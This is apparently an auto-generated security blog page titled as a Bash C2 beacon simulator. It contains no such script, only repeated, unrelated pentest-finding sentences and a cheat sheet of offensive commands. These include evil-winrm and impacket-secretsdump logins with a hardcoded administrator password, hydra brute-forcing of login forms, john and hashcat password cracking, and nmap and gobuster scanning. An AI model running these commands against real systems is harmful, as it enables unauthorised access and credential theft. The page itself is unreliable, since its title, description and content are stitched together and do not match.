---
TitleSEO: "C2 Beacon Simulator in Bash | ZureFX"
TitlePost: "C2 Beacon Simulator — Bash"
Author: "ZureFX"
Description: "A Bash script for c2 beacon simulator. Built for security research and automation."
Keywords: "automation, tool, go, fuzzer, parser, bash"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-107.html"
URL_IMAGES: ""
Date: "2025-05-20"
Tags: "Automation, Tool, Go, Fuzzer, Parser, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-107"
Permalink: "/scripting/script-c2-beacon-simulator-107.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `crackmapexec`
- `impacket`
- `GetNPUsers`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p80,8888,143 10.44.33.197 -oN scan.txt
```

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
evil-winrm -i 10.105.111.238 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.99.155
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.138.140 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.18.44 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.62.217
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.58.165.149/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.124.26.24 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 4.22s
```
